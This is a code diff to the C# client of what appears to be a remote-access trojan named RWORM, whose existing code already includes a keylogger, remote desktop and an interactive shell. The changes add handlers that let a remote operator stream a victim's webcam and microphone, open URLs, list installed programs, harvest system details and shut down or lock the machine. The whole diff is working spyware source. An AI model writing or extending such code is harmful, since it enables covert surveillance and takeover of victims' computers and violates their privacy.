@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 
 using System.Net.Sockets;
 
@@ -55,6 +55,8 @@ namespace RWORM.Client.Network
         private bool          _keyloggerOnline;   // mode the running logger is in
 
         private RemoteDesktop?_remoteDesktop;
+        private WebcamManager? _webcamManager;
+        private AudioManager?  _audioManager;
 
 
 
@@ -406,6 +408,8 @@ namespace RWORM.Client.Network
             CloseInteractiveShell();
 
             _remoteDesktop?.Stop();
+            _webcamManager?.Stop();
+            _audioManager?.Stop();
 
             try { _stream?.Close(); } catch { }
 
@@ -869,6 +873,62 @@ namespace RWORM.Client.Network
                     break;
 
 
+
+                // ── Webcam 0xE0-0xE3 ───────────────────────────────────────
+                case 0xE0: // WEBCAM_DEVICES_REQ
+                    await SendAsync(CreatePacket(0xE1, 0, WebcamManager.GetDevicesJson()));
+                    break;
+                case 0xE2: // WEBCAM_START — payload = index (ascii)
+                {
+                    int devIdx = 0;
+                    if (payload.Length > 0 && int.TryParse(txt(), out int parsedDev))
+                        devIdx = parsedDev;
+                    _webcamManager?.Stop();
+                    _webcamManager = new WebcamManager(devIdx, async frame => await SendAsync(CreatePacket(0xE3, 0, frame)));
+                    _webcamManager.Start();
+                    break;
+                }
+                case 0xE4: // WEBCAM_STOP
+                    _webcamManager?.Stop();
+                    _webcamManager = null;
+                    break;
+
+                // ── Audio 0xE5-0xE7 ─────────────────────────────────────────
+                case 0xE5: // AUDIO_START
+                    _audioManager?.Stop();
+                    _audioManager = new AudioManager(async chunk => await SendAsync(CreatePacket(0xE6, 0, chunk)));
+                    _audioManager.Start();
+                    break;
+                case 0xE7: // AUDIO_STOP
+                    _audioManager?.Stop();
+                    _audioManager = null;
+                    break;
+
+                // ── URL & System 0xD0-0xD8 ──────────────────────────────────
+                case 0xD0: // OPEN_URL — payload = url
+                    await SendAsync(CreatePacket(0xD1, 0, UrlOpener.OpenUrl(txt())));
+                    break;
+                case 0xD2: // INSTALLED_PROGS_REQ
+                    await SendAsync(CreatePacket(0xD3, 0, InstalledPrograms.GetInstalledPrograms()));
+                    break;
+                case 0xD4: // SYSINFO_DETAILED_REQ
+                    await SendAsync(CreatePacket(0xD5, 0, SystemInfoDetailed.GetDetailedInfo()));
+                    break;
+                case 0xD6: // PC_POWER — payload = action
+                {
+                    string action = txt().Trim().ToLowerInvariant();
+                    switch (action)
+                    {
+                        case "shutdown":  PowerControl.Shutdown();  break;
+                        case "restart":   PowerControl.Restart();   break;
+                        case "logoff":    PowerControl.Logoff();    break;
+                        case "lock":      PowerControl.Lock();      break;
+                        case "sleep":     PowerControl.Sleep();     break;
+                        case "hibernate": PowerControl.Hibernate(); break;
+                    }
+                    await SendAsync(CreatePacket(0xD7, 0, Encoding.UTF8.GetBytes("{\"ok\":true}")));
+                    break;
+                }
 
                 // ── Client control ─────────────────────────────────────────
 
